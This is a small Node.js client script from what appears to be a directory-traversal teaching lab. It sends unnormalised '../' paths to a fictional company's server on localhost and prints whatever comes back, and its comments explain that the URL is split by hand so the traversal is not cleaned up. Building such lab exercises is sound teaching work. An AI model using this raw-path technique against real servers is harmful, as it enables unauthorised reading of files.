// attack.js — sends a single request to the Wishful Thinking Inc. server and
// prints whatever the server returns. You do NOT need to edit this file.
//
// attack.sh sets ATTACK_PATH to the URL you want to reach, then runs this script
// with that URL. Whatever the server sends back (a file's contents, a directory
// listing, or a 404) is printed straight to your terminal.
//
// Usage (attack.sh does this for you):
//   node attack.js "http://localhost:8888/general/reports.txt"
//
// NOTE: this script sends your path to the server EXACTLY as you typed it,
// including any "../" sequences. That is on purpose — a directory-traversal
// attack depends on the "../" reaching the server untouched so the server (not
// your client) is the one that resolves it and walks out of its own folder.

var http = require("http");

// The target URL comes from attack.sh (the first argument), or falls back to
// the ATTACK_PATH environment variable if one is set.
var target = process.argv[2] || process.env.ATTACK_PATH;

if (!target) {
  console.error("No target URL given. Set ATTACK_PATH in attack.sh first.");
  process.exit(1);
}

// Split off "http://host:port" and keep the rest of the path RAW. We do this by
// hand instead of using Node's URL parser, because the URL parser would "clean
// up" the "../" sequences before they ever hit the server — which would quietly
// defeat the traversal.
var m = target.match(/^https?:\/\/([^\/]+)(\/.*)?$/);
if (!m) {
  console.error("Could not understand the URL: " + target);
  console.error('Expected something like "http://localhost:8888/some/path".');
  process.exit(1);
}
var hostPort = m[1].split(":");
var host = hostPort[0];
var port = parseInt(hostPort[1], 10) || 80;
var rawPath = m[2] || "/";

console.log("[*] Requesting: " + target);

var req = http.request({ host: host, port: port, path: rawPath, method: "GET" }, function (res) {
  var body = "";
  res.setEncoding("utf8");
  res.on("data", function (chunk) { body += chunk; });
  res.on("end", function () {
    console.log("[*] Status: " + res.statusCode);
    console.log("----- server response -----");
    process.stdout.write(body);
    console.log("\n---------------------------");
  });
});

req.on("error", function (err) {
  console.error("[!] Request failed: " + err.message);
  console.error("    - Make sure ATTACK_PATH is a full URL, e.g. http://localhost:8888/general/reports.txt");
  console.error("    - The Wishful Thinking Inc. FTP service starts automatically on :8888. If it isn't responding,");
  console.error("      exit the container (type 'exit'), re-run it, and try again.");
  process.exit(1);
});

req.end();
